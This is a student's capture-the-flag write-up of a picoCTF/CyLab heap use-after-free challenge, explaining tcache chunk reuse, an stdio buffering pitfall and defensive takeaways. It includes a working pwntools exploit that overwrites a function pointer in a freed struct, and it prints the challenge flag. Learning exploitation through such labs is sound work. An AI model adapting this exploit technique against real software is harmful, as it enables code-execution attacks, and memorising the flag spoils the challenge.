# Unsubscriptions Are Free — Heap Use-After-Free & Tcache Reuse

**Platform:** [CyLab Security Academy](https://learn.cylabacademy.org/) / [picoCTF](https://play.picoctf.org/)  
**Category:** Binary Exploitation (Heap / UAF)  
**Difficulty:** Medium (CyLab 3)  
**Tools:** `file`, `checksec`, GDB with `pwndbg`, Python 3 (`pwntools`)  
**Binary:** 32-bit ELF (`vuln`) — provided with source `vuln.c`  

---

## TL;DR

A classic 32-bit Heap **Use-After-Free (UAF)** challenge. The application frees a heap-allocated command structure upon unsubscribing (`free(user)`), but leaves behind a dangling pointer. By invoking the feedback option, glibc's **tcache** reallocates the exact same freed chunk for our message buffer. Overwriting the structure's function pointer with the address of `hahaexploitgobrrr()` redirects execution to print the flag. A critical real-world trap encountered was **stdio buffering** desynchronization between `scanf()` and raw `read()`.

---

## Student's Learning Note: Core Concepts

As a 2nd-year CS student exploring dynamic memory internals, two mechanisms in this binary were eye-opening:

1. **Use-After-Free (UAF):** When memory is released via `free(ptr)`, the pointer variable itself is not automatically cleared to `NULL`. If the application later accesses `ptr`, it manipulates stale or reallocated heap memory.
2. **glibc Tcache (LIFO):** For performance, glibc caches small freed chunks (≤ 0x410 bytes) in per-thread singly-linked bins (tcache). When another `malloc` of the same size class is called, it reuses the most recently freed chunk first (Last-In, First-Out).

---

## Reconnaissance & Source Review

Checking the binary with `checksec`:
* **Arch:** Intel i386 (32-bit LSB)
* **Canary:** No canary found
* **NX:** NX enabled (Heap & Stack non-executable)
* **PIE:** No PIE (`0x08048000` base) — Function addresses are constant!

The source code reveals a command struct with a function pointer at offset 0:

```c
typedef struct {
    uintptr_t (*whatToDo)();   // Function pointer at offset 0
    char *username;
} cmd;

cmd *user;
```

In `main()`:
1. `user = malloc(sizeof(cmd));` $\rightarrow$ Allocates a small chunk (0x10 size class).
2. Option `'I'` calls `i()`: Asks for confirmation, then executes `free(user);`. Crucially, `user` is **never set to NULL**.
3. Option `'L'` calls `leaveMessage()`: Allocates `msg = malloc(8);` and reads 8 bytes from `stdin` via `read(0, msg, 8);`.
4. In the main loop: The program repeatedly attempts to execute `doProcess(user)`, which triggers `(*user->whatToDo)();`.

---

## Vulnerability & Exploitation Strategy

```text
1. Initial Allocation:
   [ Chunk @ Heap ] -> Holds struct cmd { whatToDo, username }

2. Trigger Option 'I' (Unsubscribe):
   free(user);      -> Chunk placed into tcache list (0x10 bin).
                       'user' pointer remains pointing here (Dangling Pointer!).

3. Trigger Option 'L' (Leave Message):
   msg = malloc(8); -> glibc reuses the exact same 0x10 chunk from tcache!
   read(0, msg, 8); -> We write: [ &hahaexploitgobrrr ] + [ padding ]

4. Program Loop:
   Calls (*user->whatToDo)(); -> Execution hijacked to hahaexploitgobrrr()!
```

Target address obtained via `nm`:
* `hahaexploitgobrrr` = `0x08049266`

---

## The Debugging Hurdle: stdio Buffering

During my initial exploit attempt, piping `b"I\nY\nL" + payload` caused the process to crash with `SIGSEGV`. 

**Root Cause:**  
`scanf()` uses buffered I/O, meaning it pre-fetches extra bytes into its internal buffer. When the program later called `read(0, msg, 8)` directly on file descriptor `0`, the socket stream had already been drained by `scanf`. `read()` returned 0 bytes, leaving the chunk unpopulated.

**Fix:**  
Synchronize I/O strictly with remote prompts:
1. Send `'I\n'`, wait for `(Y/N)?`.
2. Send `'Y\n'`, wait for the menu.
3. Send `'L'` alone, wait for the `try anyways:` prompt.
4. Only then transmit the 8-byte payload: `p32(0x08049266) + b"AAAA"`.

---

## Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

EXE = "./vuln"
HOST = "xebec.cylabacademy.net"
PORT = 30956

TARGET_FUNC = 0x08049266  # hahaexploitgobrrr()

def main():
    p = remote(HOST, PORT)

    # 1. Free the user chunk
    p.recvuntil(b"(e)xit")
    p.send(b"I\n")
    p.recvuntil(b"(Y/N)?")
    p.send(b"Y\n")

    # 2. Reallocate chunk and overwrite function pointer
    p.recvuntil(b"(e)xit")
    p.send(b"L")
    p.recvuntil(b"try anyways:")
    p.send(p32(TARGET_FUNC) + b"AAAA")

    # 3. Receive flag
    flag_output = p.recvall(timeout=5).decode(errors="replace")
    print(flag_output)

if __name__ == "__main__":
    main()
```

*(See [`exploit.py`](exploit.py) for the complete script).*

---

## Flag & Key Takeaways

```text
academy{d0ubl3_j30p4rdy_b4d7c2a7}
```

1. **Always Nullify Freed Pointers:** Setting `ptr = NULL` immediately after `free()` is the single most effective defense against UAF.
2. **Understand Memory Allocator Reuse:** In modern allocators like glibc tcache, recently freed chunks of the same size class are immediately recycled.
3. **Be Aware of Mixed I/O Buffering:** Combining `scanf()` / `fgets()` with low-level `read(0, ...)` often leads to race conditions or buffer desynchronization in exploits.
